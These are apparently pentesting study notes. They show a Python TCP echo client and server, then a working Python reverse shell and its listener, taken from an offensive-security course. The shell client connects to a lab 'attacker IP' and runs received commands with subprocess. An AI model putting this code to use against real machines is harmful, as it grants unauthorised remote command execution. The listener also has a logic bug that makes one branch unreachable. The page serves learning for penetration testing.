---
title: Coding a TCP connection and d reverse shell
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, python
---

# Coding a TCP connection and a reverse shell

## Basic connection 

From eJPT study module + the book Networking computers.

### Client side

```python
from socket import *
serverName = "servername or ip"
serverPort = 12000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))

sentence = str(input("Enter a sentence in lower case: "))
clientSocket.send(sentence.encode())
modifiedSentence = clientSocket.recv(1024)

print("From server: ", modifiedSentence.decode())
clientSocket.close()
```

### Server  side

```python
from socket import *

serverPort = 12000
serverSocket = socket(AF_INET, SOCK_STREAM)

serverSocket.bind(('', serverPort))
serverSocket.listen(1)
print("Server is ready to receive...")

while True:
	connectionSocket, addr = serverSocket.accept()
	sentence = connectionSocket.recv(1024).decode()
	capitalizedsentence = sentence.upper()
	connectionSocket.send(capitalizedsentence.encode())
	connectionSocket.close()
```


## Reverse TCP connection 

From the course: Python For Offensive PenTest: A Complete Practical  

### Client side

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket    # For Building TCP Connection
import subprocess # To start the shell in the system

def connect():
    s = socket.socket()
    s.connect(('10.0.2.6', 1234)) # Here we define the Attacker IP and the listening port

    while True:
        command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket

        if 'terminate' in command.decode(): # if we got terminate order from the attacker, close the socket and break the loop
            s.close()
            break
        else:   # otherwise, we pass the received command to a shell process

            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read()) # send back the result
            s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error

def main():
    connect()
main()
        
```

### Server side

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket

def connect():

    s = socket.socket()
    s.bind(("10.0.2.15", 1234))
    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single
    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode())
            conn.close()
            break
        elif '' in command: # If the user just click enter, we will send a whoami command
            conn.send('whoami'.encode()) 
            print( conn.recv(1024).decode()) 
        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(1024).decode()) # print the result that we got back

def main():
    connect()
main()

```


## Using pyinstaller

See [pyinstaller](../pyinstaller.md).